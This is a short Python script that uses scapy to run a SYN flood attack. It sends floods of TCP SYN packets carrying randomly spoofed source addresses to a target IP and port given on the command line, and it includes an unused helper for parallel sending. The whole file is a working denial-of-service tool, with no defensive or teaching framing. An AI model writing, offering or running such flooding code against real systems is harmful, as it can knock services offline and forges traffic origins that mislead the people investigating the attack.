#!/usr/bin/env python3
from scapy.all import *
import os
from subprocess import run
from sys import argv
from random import randint, _urandom
from multiprocessing import Pool
from joblib import Parallel, delayed
from socket import socket, AF_INET, SOCK_DGRAM

def randomIP():
    return ".".join(map(str, (randint(0,255)for _ in range(4))))

def send_syn(dstIP,dstPort,num_pkts):
    print("Packets are sending ...")
    for i in range(num_pkts):
        print(i)
        s_port = randint(1000,9000)
        s_eq = randint(1000,9000)
        w_indow = randint(1000,9000)

        IP_Packet = IP()
        IP_Packet.src = randomIP()
        IP_Packet.dst = dstIP

        TCP_Packet = TCP()	
        TCP_Packet.sport = s_port
        TCP_Packet.dport = dstPort
        TCP_Packet.flags = "S"
        TCP_Packet.seq = s_eq
        TCP_Packet.window = w_indow

        send(IP_Packet/TCP_Packet, verbose=0)

def syn_flood(func,num_jobs):
    Parallel(n_jobs=num_jobs)(delayed(func) for i in range(num_jobs))

if __name__ == "__main__":
    dstIP,dstPort = argv[1], int(argv[2])
    num_pkts = int(argv[3])
    send_syn(dstIP,dstPort,num_pkts)
